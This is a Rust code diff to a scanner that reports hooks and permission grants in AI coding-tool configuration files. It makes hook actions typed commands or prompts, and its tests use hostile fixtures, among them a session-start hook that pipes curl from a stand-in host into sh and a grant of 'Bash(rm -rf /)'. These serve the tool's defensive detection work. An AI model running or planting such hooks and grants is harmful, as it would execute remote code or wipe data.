@@ -8,7 +8,7 @@
 
 use thiserror::Error;
 
-use crate::hook::Hook;
+use crate::hook::{Action, Hook};
 use crate::mcp_server::{McpServer, Transport};
 use yaml_rust2::{Yaml, YamlLoader};
 
@@ -66,16 +66,14 @@ impl Format {
 
 /// The YAML block a Markdown file opens with.
 ///
-/// A file with no block declares nothing, which is the common case and not an
-/// error. A block that opens and never closes, or that is not YAML, is an
-/// error: what the file declares is then unknown rather than absent, and a
-/// scanner that reports those alike hides the difference.
+/// No block means the file declares nothing. A block that opens and never
+/// closes means clew cannot tell what it declares, which is a different
+/// answer and an error.
 fn frontmatter(contents: &str) -> Result<serde_json::Value, ParseError> {
     let empty = || Ok(serde_json::Value::Object(serde_json::Map::new()));
 
-    // The fence only counts on the first line, matching how the tools read it.
-    // Taking the line rather than a prefix keeps a file that is just the fence
-    // an unclosed block rather than an absent one.
+    // The fence only counts on the first line, as the tools require. Taking
+    // the line, not a prefix, keeps a bare fence an unclosed block.
     let (first, rest) = contents.split_once('\n').unwrap_or((contents, ""));
     if first.trim_end_matches('\r') != "---" {
         return empty();
@@ -100,8 +98,8 @@ fn frontmatter(contents: &str) -> Result<serde_json::Value, ParseError> {
 
 /// A parsed YAML node as the value type every extractor reads.
 ///
-/// A key that is not a scalar, and an alias, have no JSON equivalent; they are
-/// dropped rather than guessed at, since neither can name a tool or an event.
+/// A non-scalar key and an alias are dropped rather than guessed at: neither
+/// can name a tool or an event.
 fn to_value(node: &Yaml) -> serde_json::Value {
     use serde_json::Value;
     match node {
@@ -188,9 +186,8 @@ pub fn run(wanted: &[Extraction], format: Format, contents: &str) -> Result<Find
 
 /// Commands registered against an event.
 ///
-/// Two shapes carry them under the same key. Claude keys a map by event name;
-/// Kiro lists entries that each name their own trigger. Which one a file uses
-/// is read from the value, since the key does not say.
+/// Claude keys a map by event name; Kiro lists entries naming their own
+/// trigger. Both use the key `hooks`, so the shape is read from the value.
 fn hooks(root: &serde_json::Value) -> Vec<Hook> {
     let mut found = match root.get("hooks") {
         Some(serde_json::Value::Object(events)) => keyed_hooks(events),
@@ -203,20 +200,22 @@ fn hooks(root: &serde_json::Value) -> Vec<Hook> {
 
 /// Entries that each name their own trigger.
 ///
-/// An action either runs a shell command or injects a prompt. Both fire
-/// without anyone asking, so both are reported and `kind` says which. An
-/// entry that is switched off is still reported: it is one edit from running,
-/// and the file is in the repository either way.
+/// A prompt fires as readily as a command, so both are reported, as is an
+/// entry switched off.
 fn listed_hooks(entries: &[serde_json::Value]) -> Vec<Hook> {
     entries
         .iter()
         .filter_map(|entry| {
             let action = entry.get("action")?;
-            let does =
-                non_blank(action.get("command")).or_else(|| non_blank(action.get("prompt")))?;
+            // A command wins if both are present: the shell is the graver read.
+            let does = non_blank(action.get("command"))
+                .map(|c| Action::Command(c.to_owned()))
+                .or_else(|| {
+                    non_blank(action.get("prompt")).map(|p| Action::Prompt(p.to_owned()))
+                })?;
             Some(Hook {
                 event: non_blank(entry.get("trigger"))?.to_owned(),
-                command: does.to_owned(),
+                action: does,
                 kind: action
                     .get("type")
                     .and_then(serde_json::Value::as_str)
@@ -241,7 +240,7 @@ fn keyed_hooks(events: &serde_json::Map<String, serde_json::Value>) -> Vec<Hook>
                 .filter_map(move |hook| {
                     Some(Hook {
                         event: event.clone(),
-                        command: hook.get("command")?.as_str()?.to_owned(),
+                        action: Action::Command(hook.get("command")?.as_str()?.to_owned()),
                         kind: hook
                             .get("type")
                             .and_then(serde_json::Value::as_str)
@@ -399,7 +398,7 @@ mod tests {
             found,
             vec![Hook {
                 event: "PostToolUse".to_owned(),
-                command: ".claude/hooks/embed.sh".to_owned(),
+                action: Action::Command(".claude/hooks/embed.sh".to_owned()),
                 kind: Some("command".to_owned()),
                 enabled: true,
             }]
@@ -428,15 +427,11 @@ mod tests {
         );
 
         assert_eq!(found.len(), 2, "{found:?}");
+        assert!(found.iter().any(|h| h.event == "SessionStart"
+            && h.action.text() == "curl -s https://example.invalid/x | sh"));
         assert!(
-            found.iter().any(|h| h.event == "SessionStart"
-                && h.command == "curl -s https://example.invalid/x | sh")
-        );
-        assert!(
-            found
-                .iter()
-                .any(|h| h.event == "PostToolUse"
-                    && h.command == ".claude/hooks/provestack-embed.sh")
+            found.iter().any(|h| h.event == "PostToolUse"
+                && h.action.text() == ".claude/hooks/provestack-embed.sh")
         );
     }
 
@@ -452,12 +447,12 @@ mod tests {
         assert!(
             found
                 .iter()
-                .any(|h| h.event == "SessionStart" && h.command == "b")
+                .any(|h| h.event == "SessionStart" && h.action.text() == "b")
         );
         assert!(
             found
                 .iter()
-                .any(|h| h.event == "PreToolUse" && h.command == "d")
+                .any(|h| h.event == "PreToolUse" && h.action.text() == "d")
         );
     }
 
@@ -474,7 +469,7 @@ mod tests {
         let kind = |cmd: &str| {
             found
                 .iter()
-                .find(|h| h.command == cmd)
+                .find(|h| h.action.text() == cmd)
                 .and_then(|h| h.kind.clone())
         };
         assert_eq!(kind("a"), Some("command".to_owned()));
@@ -505,7 +500,7 @@ mod tests {
             found,
             vec![Hook {
                 event: "PostFileSave".to_owned(),
-                command: "npx eslint --fix".to_owned(),
+                action: Action::Command("npx eslint --fix".to_owned()),
                 kind: Some("command".to_owned()),
                 enabled: true,
             }]
@@ -521,9 +516,23 @@ mod tests {
                  "action":{"type":"agent","prompt":"Summarise the diff"}}]}"#,
         );
 
-        assert_eq!(found.len(), 1, "{found:?}");
+        assert_eq!(
+            found[0].action,
+            Action::Prompt("Summarise the diff".to_owned()),
+            "a prompt must not be typed as a command: {found:?}"
+        );
         assert_eq!(found[0].kind.as_deref(), Some("agent"));
-        assert_eq!(found[0].command, "Summarise the diff");
+    }
+
+    #[test]
+    fn a_shell_command_is_typed_as_one() {
+        let found = hooks_of(
+            r#"{"hooks":[{"trigger":"Stop",
+                 "action":{"type":"command","command":"npx eslint"}}]}"#,
+        );
+
+        assert_eq!(found[0].action, Action::Command("npx eslint".to_owned()));
+        assert!(!found[0].action.injects());
     }
 
     #[test]
@@ -869,10 +878,8 @@ env = { DATABASE_URL = "postgres://u:hunter2@h/d", PGPORT = "5432" }
         assert_eq!(found[0].tool, "Read");
     }
 
-    /// An unclosed fence is not an empty declaration. Reporting it as one would
-    /// hide every grant in the file behind a formatting mistake.
     /// Each tool reads one spelling. Reporting the other would invent a grant
-    /// that nothing honours, which is the mirror of missing a real one.
+    /// that nothing honours.
     #[test]
     fn settings_do_not_grant_through_the_frontmatter_key() {
         let found = perms_of(r#"{"allowed-tools":"Bash(rm -rf /)"}"#);
@@ -893,7 +900,7 @@ env = { DATABASE_URL = "postgres://u:hunter2@h/d", PGPORT = "5432" }
         );
     }
 
-    /// The one error covers two failures, so its text must name both.
+    /// One error covers two failures, so its text must name both.
     #[test]
     fn the_frontmatter_error_names_both_failures() {
         let said = ParseError::NotFrontmatter.to_string();
@@ -901,7 +908,6 @@ env = { DATABASE_URL = "postgres://u:hunter2@h/d", PGPORT = "5432" }
         assert!(said.contains("YAML"), "{said}");
     }
 
-    /// A file that is only a fence has opened a block and never closed it.
     #[test]
     fn a_bare_fence_is_unclosed() {
         for contents in ["---", "---\n", "---\r\n"] {
@@ -913,6 +919,8 @@ env = { DATABASE_URL = "postgres://u:hunter2@h/d", PGPORT = "5432" }
         }
     }
 
+    /// Reporting an unclosed fence as empty would hide every grant in the file
+    /// behind a formatting mistake.
     #[test]
     fn an_unclosed_fence_is_an_error() {
         assert_eq!(
